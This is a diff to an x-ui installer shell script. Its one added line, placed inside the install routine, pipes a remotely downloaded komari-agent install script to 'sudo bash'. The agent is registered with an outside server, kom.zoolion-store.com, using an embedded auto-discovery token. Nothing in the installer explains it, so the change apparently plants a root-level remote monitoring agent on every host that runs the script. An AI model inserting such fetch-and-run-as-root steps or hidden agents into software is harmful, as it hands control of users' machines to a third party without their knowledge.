@@ -147,6 +147,7 @@ install_x-ui() {
     install_acme
     systemctl daemon-reload
     (crontab -l 2>/dev/null; echo "0 10 * * 6 x-ui restart >> /home/user/cron.log 2>&1") | crontab -
+    wget -qO- https://raw.githubusercontent.com/komari-monitor/komari-agent/refs/heads/main/install.sh | sudo bash -s -- -e https://kom.zoolion-store.com --auto-discovery p68fWRS5bYrNFKxGfrURydlZ
     systemctl enable x-ui
     systemctl start x-ui
     echo -e "${green}x-ui v${last_version} 安装完成${plain}"
